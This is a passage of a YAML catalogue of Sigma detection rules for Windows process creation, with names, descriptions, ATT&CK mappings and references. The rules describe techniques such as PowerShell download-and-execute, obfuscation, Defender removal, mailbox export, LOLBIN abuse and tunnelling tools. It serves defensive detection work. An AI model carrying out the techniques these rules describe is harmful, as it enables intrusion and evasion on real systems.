  - https://www.elastic.co/guide/en/security/current/volume-shadow-copy-deletion-via-powershell.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: 25676e10-2121-446e-80a4-71ff8506af47
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_powershell_snapins_hafnium.yml
  name: Exchange PowerShell Snap-Ins Usage
  description: Detects adding and using Exchange PowerShell snap-ins to export mailbox
    data. As seen used by HAFNIUM and APT27
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Collection
  - Execution
  techniques:
  - T1059.001
  - T1114
  tags:
  - attack.execution
  - attack.t1059.001
  - attack.collection
  - attack.t1114
  time_window: ''
  references:
  - https://www.volexity.com/blog/2021/03/02/active-exploitation-of-microsoft-exchange-zero-day-vulnerabilities/
  - https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/
  - https://www.intrinsec.com/apt27-analysis/
  false_positives:
  - Unknown
  notes: ''
- detection_id: c49c5062-0966-4170-9efd-9968c913a6cf
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_powershell_stop_service.yml
  name: Stop Windows Service Via PowerShell Stop-Service
  description: Detects the stopping of a Windows service via the PowerShell Cmdlet
    "Stop-Service"
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1489
  tags:
  - attack.impact
  - attack.t1489
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/stop-service?view=powershell-7.4
  false_positives:
  - There are many legitimate reasons to stop a service. This rule isn't looking for
    any suspicious behaviour in particular. Filter legitimate activity accordingly
  notes: ''
- detection_id: e6c54d94-498c-4562-a37c-b469d8e9a275
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_powershell_susp_download_patterns.yml
  name: Suspicious PowerShell Download and Execute Pattern
  description: Detects suspicious PowerShell download patterns that are often used
    in malicious scripts, stagers or downloaders (make sure that your backend applies
    the strings case-insensitive)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  tags:
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://gist.github.com/jivoi/c354eaaf3019352ce32522f916c03d70
  - https://www.trendmicro.com/en_us/research/22/j/lv-ransomware-exploits-proxyshell-in-attack.html
  false_positives:
  - Software installers that pull packages from remote systems and execute them
  notes: ''
- detection_id: 36210e0d-5b19-485d-a087-c096088885f0
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_powershell_susp_parameter_variation.yml
  name: Suspicious PowerShell Parameter Substring
  description: Detects suspicious PowerShell invocation with a parameter substring
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  tags:
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - http://www.danielbohannon.com/blog-1/2017/3/12/powershell-execution-argument-obfuscation-how-it-can-make-detection-easier
  false_positives:
  - Unknown
  notes: ''
- detection_id: 754ed792-634f-40ae-b3bc-e0448d33f695
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_powershell_susp_parent_process.yml
  name: Suspicious PowerShell Parent Process
  description: Detects a suspicious or uncommon parent processes of PowerShell
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  tags:
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://speakerdeck.com/heirhabarov/hunting-for-powershell-abuse?slide=26
  false_positives:
  - Other scripts
  notes: ''
- detection_id: ac175779-025a-4f12-98b0-acdaeb77ea85
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_powershell_susp_ps_appdata.yml
  name: PowerShell Script Run in AppData
  description: Detects a suspicious command line execution that invokes PowerShell
    with reference to an AppData folder
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  tags:
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://twitter.com/JohnLaTwC/status/1082851155481288706
  - https://app.any.run/tasks/f87f1c4e-47e2-4c46-9cf4-31454c06ce03
  false_positives:
  - Administrative scripts
  notes: ''
- detection_id: deb9b646-a508-44ee-b7c9-d8965921c6b6
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_powershell_token_obfuscation.yml
  name: Powershell Token Obfuscation - Process Creation
  description: Detects TOKEN OBFUSCATION technique from Invoke-Obfuscation
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1027.009
  tags:
  - attack.defense-evasion
  - attack.t1027.009
  time_window: ''
  references:
  - https://github.com/danielbohannon/Invoke-Obfuscation
  false_positives:
  - Unknown
  notes: ''
- detection_id: c443012c-7928-43bf-ac20-7eda5efe61ad
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_powershell_uninstall_defender_feature.yml
  name: Suspicious Uninstall of Windows Defender Feature via PowerShell
  description: 'Detects the use of PowerShell with Uninstall-WindowsFeature or Remove-WindowsFeature
    cmdlets to disable or remove the Windows Defender GUI feature, a common technique
    used by adversaries to evade defenses.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: experimental
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1562.001
  tags:
  - attack.defense-evasion
  - attack.t1562.001
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/powershell/module/microsoft.windows.servermanager.migration/uninstall-windowsfeature
  - https://thedfirreport.com/2023/04/03/malicious-iso-file-leads-to-domain-wide-ransomware
  false_positives:
  - Unknown
  notes: ''
- detection_id: 1114e048-b69c-4f41-bc20-657245ae6e3f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_powershell_user_discovery_get_aduser.yml
  name: User Discovery And Export Via Get-ADUser Cmdlet
  description: Detects usage of the Get-ADUser cmdlet to collect user information
    and output it to a file
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1033
  tags:
  - attack.discovery
  - attack.t1033
  time_window: ''
  references:
  - http://blog.talosintelligence.com/2022/09/lazarus-three-rats.html
  - https://www.microsoft.com/en-us/security/blog/2022/10/18/defenders-beware-a-case-for-post-ransomware-investigations/
  false_positives:
  - Legitimate admin scripts may use the same technique, it's better to exclude specific
    computers or users who execute these commands or scripts often
  notes: ''
- detection_id: c86133ad-4725-4bd0-8170-210788e0a7ba
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_powershell_webclient_casing.yml
  name: Net WebClient Casing Anomalies
  description: Detects PowerShell command line contents that include a suspicious
    abnormal casing in the Net.Webclient (e.g. nEt.WEbCliEnT) string as used in obfuscation
    techniques
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  tags:
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://app.any.run/tasks/b9040c63-c140-479b-ad59-f1bb56ce7a97/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 114de787-4eb2-48cc-abdb-c0b449f93ea4
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_powershell_x509enrollment.yml
  name: Suspicious X509Enrollment - Process Creation
  description: Detect use of X509Enrollment
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1553.004
  tags:
  - attack.defense-evasion
  - attack.t1553.004
  time_window: ''
  references:
  - https://speakerdeck.com/heirhabarov/hunting-for-powershell-abuse?slide=42
  - https://speakerdeck.com/heirhabarov/hunting-for-powershell-abuse?slide=41
  - https://learn.microsoft.com/en-us/dotnet/api/microsoft.hpc.scheduler.store.cx509enrollmentwebclassfactoryclass?view=hpc-sdk-5.1.6115
  false_positives:
  - Legitimate administrative script
  notes: ''
- detection_id: bb780e0c-16cf-4383-8383-1e5471db6cf9
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_powershell_xor_commandline.yml
  name: Suspicious XOR Encoded PowerShell Command
  description: Detects presence of a potentially xor encoded powershell command
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - multi_signal_correlation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1027
  - T1059.001
  - T1140
  tags:
  - attack.defense-evasion
  - attack.execution
  - attack.t1059.001
  - attack.t1140
  - attack.t1027
  time_window: ''
  references:
  - https://speakerdeck.com/heirhabarov/hunting-for-powershell-abuse?slide=65
  - https://redcanary.com/blog/yellow-cockatoo/
  - https://zero2auto.com/2020/05/19/netwalker-re/
  - https://mez0.cc/posts/cobaltstrike-powershell-exec/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 85a8e5ba-bd03-4bfb-bbfa-a4409a8f8b98
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_powershell_zip_compress.yml
  name: Folder Compress To Potentially Suspicious Output Via Compress-Archive Cmdlet
  description: 'Detects PowerShell scripts that make use of the "Compress-Archive"
    Cmdlet in order to compress folders and files where the output is stored in a
    potentially suspicious location that is used often by malware for exfiltration.

    An adversary might compress data (e.g., sensitive documents) that is collected
    prior to exfiltration in order to make it portable and minimize the amount of
    data sent over the network.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Collection
  techniques:
  - T1074.001
  tags:
  - attack.collection
  - attack.t1074.001
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1074.001/T1074.001.md
  - https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-347a
  false_positives:
  - Unknown
  notes: ''
- detection_id: b124ddf4-778d-418e-907f-6dd3fc0d31cd
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_presentationhost_download.yml
  name: Arbitrary File Download Via PresentationHost.EXE
  description: Detects usage of "PresentationHost" which is a utility that runs ".xbap"
    (Browser Applications) files to download arbitrary files
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1218
  tags:
  - attack.defense-evasion
  - attack.execution
  - attack.t1218
  time_window: ''
  references:
  - https://github.com/LOLBAS-Project/LOLBAS/pull/239/files
  false_positives:
  - Unknown
  notes: ''
- detection_id: d22e2925-cfd8-463f-96f6-89cec9d9bc5f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_presentationhost_uncommon_location_exec.yml
  name: XBAP Execution From Uncommon Locations Via PresentationHost.EXE
  description: 'Detects the execution of ".xbap" (Browser Applications) files via
    PresentationHost.EXE from an uncommon location. These files can be abused to run
    malicious ".xbap" files any bypass AWL

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1218
  tags:
  - attack.defense-evasion
  - attack.execution
  - attack.t1218
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/Binaries/Presentationhost/
  false_positives:
  - Legitimate ".xbap" being executed via "PresentationHost"
  notes: ''
- detection_id: a20391f8-76fb-437b-abc0-dba2df1952c6
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_pressanykey_lolbin_execution.yml
  name: Visual Studio NodejsTools PressAnyKey Arbitrary Binary Execution
  description: Detects child processes of Microsoft.NodejsTools.PressAnyKey.exe that
    can be used to execute any other binary
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1218
  tags:
  - attack.execution
  - attack.defense-evasion
  - attack.t1218
  time_window: ''
  references:
  - https://twitter.com/mrd0x/status/1463526834918854661
  - https://gist.github.com/nasbench/a989ce64cefa8081bd50cf6ad8c491b5
  false_positives:
  - Legitimate use by developers as part of NodeJS development with Visual Studio
    Tools
  notes: ''
- detection_id: bafac3d6-7de9-4dd9-8874-4a1194b493ed
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_print_remote_file_copy.yml
  name: Abusing Print Executable
  description: Attackers can use print.exe for remote file copy
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218
  tags:
  - attack.defense-evasion
  - attack.t1218
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/Binaries/Print/
  - https://twitter.com/Oddvarmoe/status/985518877076541440
  false_positives:
  - Unknown
  notes: ''
- detection_id: 104cdb48-a7a8-4ca7-a453-32942c6e5dcb
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_protocolhandler_download.yml
  name: File Download Using ProtocolHandler.exe
  description: 'Detects usage of "ProtocolHandler" to download files. Downloaded files
    will be located in the cache folder (for example - %LOCALAPPDATA%\Microsoft\Windows\INetCache\IE)

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218
  tags:
  - attack.defense-evasion
  - attack.t1218
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1218/T1218.md
  - https://lolbas-project.github.io/lolbas/OtherMSBinaries/ProtocolHandler/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 7f5d1c9a-3e83-48df-95a7-2b98aae6c13c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_provlaunch_potential_abuse.yml
  name: Potential Provlaunch.EXE Binary Proxy Execution Abuse
  description: Detects child processes of "provlaunch.exe" which might indicate potential
    abuse to proxy execution.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218
  tags:
  - attack.defense-evasion
  - attack.t1218
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/Binaries/Provlaunch/
  - https://twitter.com/0gtweet/status/1674399582162153472
  false_positives:
  - Unknown
  notes: ''
- detection_id: f9999590-1f94-4a34-a91e-951e47bedefd
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_provlaunch_susp_child_process.yml
  name: Suspicious Provlaunch.EXE Child Process
  description: Detects suspicious child processes of "provlaunch.exe" which might
    indicate potential abuse to proxy execution.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218
  tags:
  - attack.defense-evasion
  - attack.t1218
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/Binaries/Provlaunch/
  - https://twitter.com/0gtweet/status/1674399582162153472
  false_positives:
  - Unknown
  notes: ''
- detection_id: 2158f96f-43c2-43cb-952a-ab4580f32382
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_psr_capture_screenshots.yml
  name: Screen Capture Activity Via Psr.EXE
  description: Detects execution of Windows Problem Steps Recorder (psr.exe), a utility
    used to record the user screen and clicks.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Collection
  techniques:
  - T1113
  tags:
  - attack.collection
  - attack.t1113
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/Binaries/Psr/
  - https://web.archive.org/web/20200229201156/https://www.sans.org/cyber-security-summit/archives/file/summit-archive-1493861893.pdf
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1560.001/T1560.001.md
  false_positives:
  - Unknown
  notes: ''
- detection_id: f38a82d2-fba3-4781-b549-525efbec8506
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_pua_3proxy_execution.yml
  name: PUA - 3Proxy Execution
  description: Detects the use of 3proxy, a tiny free proxy server
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1572
  tags:
  - attack.command-and-control
  - attack.t1572
  time_window: ''
  references:
  - https://github.com/3proxy/3proxy
  - https://blog.talosintelligence.com/2022/09/lazarus-three-rats.html
  false_positives:
  - Administrative activity
  notes: ''
- detection_id: 455b9d50-15a1-4b99-853f-8d37655a4c1b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_pua_adfind_enumeration.yml
  name: PUA - Suspicious ActiveDirectory Enumeration Via AdFind.EXE
  description: Detects active directory enumeration activity using known AdFind CLI
    flags
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 4
  predictive_readiness_factors:
  - time_window_aggregation
  - repeated_or_escalation_behavior
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1087.002
  tags:
  - attack.discovery
  - attack.t1087.002
  time_window: ''
  references:
  - https://www.joeware.net/freetools/tools/adfind/
  - https://social.technet.microsoft.com/wiki/contents/articles/7535.adfind-command-examples.aspx
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1087.002/T1087.002.md
  false_positives:
  - Authorized administrative activity
  notes: ''
- detection_id: 514e7e3e-b3b4-4a67-af60-be20f139198b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_pua_adfind_execution.yml
  name: PUA - AdFind.EXE Execution
  description: Detects execution of Adfind.exe utility, which can be used for reconnaissance
    in an Active Directory environment
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: medium
  status: experimental
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1087.002
  tags:
  - attack.discovery
  - attack.t1087.002
  time_window: ''
  references:
  - https://www.joeware.net/freetools/tools/adfind/
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1087.002/T1087.002.md
  false_positives:
  - Unknown
  notes: ''
- detection_id: 9a132afa-654e-11eb-ae93-0242ac130002
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_pua_adfind_susp_usage.yml
  name: PUA - AdFind Suspicious Execution
  description: Detects AdFind execution with common flags seen used during attacks
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1018
  - T1069.002
  - T1087.002
  - T1482
  tags:
  - attack.discovery
  - attack.t1018
  - attack.t1087.002
  - attack.t1482
  - attack.t1069.002
  - stp.1u
  time_window: ''
  references:
  - https://www.joeware.net/freetools/tools/adfind/
  - https://thedfirreport.com/2020/05/08/adfind-recon/
  - https://thedfirreport.com/2021/01/11/trickbot-still-alive-and-well/
  - https://www.microsoft.com/security/blog/2021/01/20/deep-dive-into-the-solorigate-second-stage-activation-from-sunburst-to-teardrop-and-raindrop/
  - https://social.technet.microsoft.com/wiki/contents/articles/7535.adfind-command-examples.aspx
  - https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/bf62ece1c679b07b5fb49c4bae947fe24c81811f/fin6/Emulation_Plan/Phase1.md
  - https://github.com/redcanaryco/atomic-red-team/blob/0f229c0e42bfe7ca736a14023836d65baa941ed2/atomics/T1087.002/T1087.002.md#atomic-test-7---adfind---enumerate-active-directory-user-objects
  false_positives:
  - Legitimate admin activity
  notes: ''
- detection_id: bef37fa2-f205-4a7b-b484-0759bfd5f86f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_pua_advanced_ip_scanner.yml
  name: PUA - Advanced IP Scanner Execution
  description: Detects the use of Advanced IP Scanner. Seems to be a popular tool
    for ransomware groups.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1046
  - T1135
  tags:
  - attack.discovery
  - attack.t1046
  - attack.t1135
  time_window: ''
  references:
  - https://news.sophos.com/en-us/2019/12/09/snatch-ransomware-reboots-pcs-into-safe-mode-to-bypass-protection/
  - https://www.fireeye.com/blog/threat-research/2020/05/tactics-techniques-procedures-associated-with-maze-ransomware-incidents.html
  - https://labs.f-secure.com/blog/prelude-to-ransomware-systembc
  - https://assets.documentcloud.org/documents/20444693/fbi-pin-egregor-ransomware-bc-01062021.pdf
  - https://thedfirreport.com/2021/01/18/all-that-for-a-coinminer
  - https://github.com/3CORESec/MAL-CL/tree/master/Descriptors/Other/Advanced%20IP%20Scanner
  false_positives:
  - Legitimate administrative use
  notes: ''
- detection_id: 54773c5f-f1cc-4703-9126-2f797d96a69d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_pua_advanced_port_scanner.yml
  name: PUA - Advanced Port Scanner Execution
  description: Detects the use of Advanced Port Scanner.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1046
  - T1135
  tags:
  - attack.discovery
  - attack.t1046
  - attack.t1135
  time_window: ''
  references:
  - https://github.com/3CORESec/MAL-CL/tree/master/Descriptors/Other/Advanced%20Port%20Scanner
  false_positives:
  - Legitimate administrative use
  - Tools with similar commandline (very rare)
  notes: ''
- detection_id: d2b749ee-4225-417e-b20e-a8d2193cbb84
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_pua_advancedrun.yml
  name: PUA - AdvancedRun Execution
  description: Detects the execution of AdvancedRun utility
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.003
  - T1134.002
  - T1564.003
  tags:
  - attack.execution
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1564.003
  - attack.t1134.002
  - attack.t1059.003
  time_window: ''
  references:
  - https://twitter.com/splinter_code/status/1483815103279603714
  - https://medium.com/s2wblog/analysis-of-destructive-malware-whispergate-targeting-ukraine-9d5d158f19f3
  - https://www.elastic.co/security-labs/operation-bleeding-bear
  - https://www.winhelponline.com/blog/run-program-as-system-localsystem-account-windows/
  false_positives:
  - Unknown
  notes: ''
- detection_id: fa00b701-44c6-4679-994d-5a18afa8a707
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_pua_advancedrun_priv_user.yml
  name: PUA - AdvancedRun Suspicious Execution
  description: Detects the execution of AdvancedRun utility in the context of the
    TrustedInstaller, SYSTEM, Local Service or Network Service accounts
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1134.002
  tags:
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1134.002
  time_window: ''
  references:
  - https://twitter.com/splinter_code/status/1483815103279603714
  - https://medium.com/s2wblog/analysis-of-destructive-malware-whispergate-targeting-ukraine-9d5d158f19f3
  - https://www.elastic.co/security-labs/operation-bleeding-bear
  - https://www.winhelponline.com/blog/run-program-as-system-localsystem-account-windows/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 8b0e12da-d3c3-49db-bb4f-256703f380e5
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_pua_chisel.yml
  name: PUA - Chisel Tunneling Tool Execution
  description: Detects usage of the Chisel tunneling tool via the commandline arguments
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1090.001
  tags:
  - attack.command-and-control
  - attack.t1090.001
  time_window: ''
  references:
  - https://github.com/jpillora/chisel/
  - https://arcticwolf.com/resources/blog/lorenz-ransomware-chiseling-in/
  - https://blog.sekoia.io/lucky-mouse-incident-response-to-detection-engineering/
  false_positives:
  - Some false positives may occur with other tools with similar commandlines
  notes: ''
- detection_id: f44800ac-38ec-471f-936e-3fa7d9c53100
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_pua_cleanwipe.yml
  name: PUA - CleanWipe Execution
  description: Detects the use of CleanWipe a tool usually used to delete Symantec
    antivirus.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1562.001
  tags:
  - attack.defense-evasion
  - attack.t1562.001
  time_window: ''
  references:
  - https://github.com/3CORESec/MAL-CL/tree/master/Descriptors/Other/CleanWipe
  false_positives:
  - Legitimate administrative use (Should be investigated either way)
  notes: ''
- detection_id: 2c32b543-1058-4808-91c6-5b31b8bed6c5
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_pua_crassus.yml
  name: PUA - Crassus Execution
  description: Detects Crassus, a Windows privilege escalation discovery tool, based
    on PE metadata characteristics.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
